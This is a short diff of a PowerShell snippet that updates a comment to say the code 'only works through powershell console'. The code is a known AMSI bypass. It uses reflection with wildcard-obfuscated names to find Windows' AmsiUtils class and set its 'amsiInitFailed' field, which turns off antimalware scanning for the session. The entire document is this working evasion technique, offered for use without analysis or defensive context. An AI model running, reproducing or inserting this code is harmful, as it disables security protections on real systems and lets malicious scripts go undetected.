@@ -1,3 +1,3 @@
-# Does not work anymore, please try another script
+# Only works through powershell console
 $Var = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}}
 $Var.SetValue($NULL,$TRUE)
